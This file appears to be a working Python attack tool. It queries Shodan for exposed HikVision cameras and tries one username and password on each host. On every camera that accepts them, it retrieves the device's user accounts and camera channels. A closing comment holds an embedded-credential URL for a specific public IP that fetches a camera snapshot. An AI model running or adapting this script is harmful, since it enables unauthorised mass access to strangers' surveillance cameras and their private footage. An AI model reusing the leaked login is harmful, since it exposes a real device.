#!/usr/bin/env python3
try:
    import click
    import shodan
    import requests
    import xmltodict
    from requests.auth import HTTPDigestAuth

except ImportError:
    print("Import Error!")
    print("Make sure you have installed all the requirements.")
    exit()


class Camera:
    address = "127.0.0.1"
    port = "80"

    username = None
    password = None

    def __init__(self, address, port):
        self.address = address
        self.port = port

    def check_creds(self, username, password):
        try:
            # Check if this is a HikVision device.
            response = requests.get(
                f"http://{self.address}:{self.port}/doc/ui/images/config-icons.png", verify=False, timeout=5)

            if response.status_code != 200:
                return False

            response = requests.get(
                f"http://{username}:{password}@{self.address}:{self.port}/ISAPI/Security/userCheck", verify=False, timeout=5)

            if response.status_code == 200:
                self.username = username
                self.password = password

                return True

        except:
            return False

    def get_cameras(self):
        response = requests.get(
            f"http://{self.address}:{self.port}/ISAPI/System/Video/inputs/channels", verify=False, timeout=5, auth=HTTPDigestAuth(self.username, self.password))

        if response.status_code == 200:
            dictionary = xmltodict.parse(response.text, dict_constructor=dict)
            return dictionary

        response = requests.get(f"http://{self.address}:{self.port}/ISAPI/System/Video/inputs/channels",
                                verify=False, timeout=5, auth=HTTPDigestAuth(self.username, self.password))

        if response.status_code == 200:
            dictionary = xmltodict.parse(response.text, dict_constructor=dict)
            return dictionary

        response = requests.get(f"http://{self.address}:{self.port}/ISAPI/ContentMgmt/InputProxy/channels",
                                verify=False, timeout=5, auth=HTTPDigestAuth(self.username, self.password))

        if response.status_code == 200:
            dictionary = xmltodict.parse(response.text, dict_constructor=dict)
            return dictionary

    def get_users(self):
        response = requests.get(f"http://{self.address}:{self.port}/ISAPI/Security/users",
                                verify=False, timeout=5, auth=HTTPDigestAuth(self.username, self.password))

        if response.status_code == 200:
            dictionary = xmltodict.parse(response.text, dict_constructor=dict)

            return dictionary["UserList"]["User"]


@click.group()
def main():
    pass


@main.command(help="Checks credentials of HikVision cameras.")
@click.option("--shodan_key", envvar="SHODAN_KEY", required=True, help="Shodan API Key")
@click.option("--query", "-q", default="Server: DNVRS-Webs")
@click.option("--username", "-u", default="admin")
@click.option("--password", "-p", required=True)
def search(shodan_key, query, username, password):
    shodan_api = shodan.Shodan(shodan_key)
    count = shodan_api.count(query)
    matches = []

    print(f"Found {count['total']} hosts!")

    for item in shodan_api.search_cursor(query, minify=True, retries=5):
        camera = Camera(item["ip_str"], item["port"])

        print(f"Checking: {camera.address}:{camera.port}")

        if camera.check_creds(username, password):
            matches.append(camera)

            # print(camera.get_cameras())
            print(camera.get_users())

            print("|---> Success! Logged to system!")

    print(f"Search done! Found {len(matches)} matches!")

    for camera in matches:
        print(f"{camera.address}:{camera.port}")


if __name__ == "__main__":
    main()


# http://admin:Monitoring123@188.114.89.250:80/ISAPI/Streaming/channels/101/picture
